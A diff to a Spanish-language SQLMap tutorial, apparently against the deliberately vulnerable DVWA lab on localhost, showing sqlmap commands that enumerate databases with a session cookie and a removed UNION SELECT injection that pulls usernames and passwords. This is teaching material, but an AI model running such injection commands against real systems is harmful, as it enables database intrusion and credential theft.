@@ -243,15 +243,12 @@ SQLMap es una herramienta de código abierto y uso automatizado para detectar y 
 #### Enumerar la BD:
 ```bash
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" --dbs
-
 ```
-
-Es lo mismo que hacer una consulta sql:
+#### Ver bases de datos disponibles:
 ```bash
-
-SELECT id, name FROM products WHERE id = '' UNION SELECT user, password FROM users#';
-
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" --dbs --batch
 ```
+
 
 Puedes ver el video del ejemplo en el siguiente link:
 
